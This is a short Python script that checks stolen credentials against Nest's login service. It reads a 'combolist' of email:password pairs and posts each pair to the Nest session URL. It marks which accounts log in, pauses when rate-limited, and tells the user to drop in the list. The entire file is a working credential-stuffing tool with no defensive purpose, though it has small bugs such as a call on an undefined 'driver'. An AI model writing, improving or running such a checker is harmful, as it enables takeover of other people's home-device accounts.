import requests
import webbrowser
import os, sys
import time
import inspect
import json
###### LOGIN URL ######
url = "https://home.nest.com/session"
######   COLORS  ######
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def welcome():
    os.system("clear")
    print ("welcome to the " + os.path.basename(__file__)[:-3] + " Checker!")

def checkValid(result, line):
    if "Too many requests" in result:
        print bcolors.WARNING + "[WARNING] Youve send too many requests. Waiting 1 Minute until the next request." + bcolors.ENDC
        time.sleep(60)
    else:
        jsonresult = json.loads(result)
        if "access_denied" not in result:
            print bcolors.OKGREEN + u'[\u2713] ' + line + bcolors.ENDC
            driver.Close()
        else:
            print bcolors.FAIL + '[X] ' + line + "|    Error: " + jsonresult['error']
            driver.Close()


def importCombolist():
    print "Please drag and drop a combolist here."
    combolistPath = raw_input('==> ')
    with open(combolistPath.replace(" ", ""), 'r') as myfile:
         for line in myfile:
             payload = 0
             line = line.replace('\n', '')
             email = line.split(":")[0]
             password = line.split(":")[1]
             payload = {'email': email, 'password': password}
             with requests.session() as s:
                 s.get(url, timeout=10)
                 r = s.post(url, data={'email': email, 'password': password})
                 #print(r.text)
                 checkValid(r.text, line)

welcome()
importCombolist()
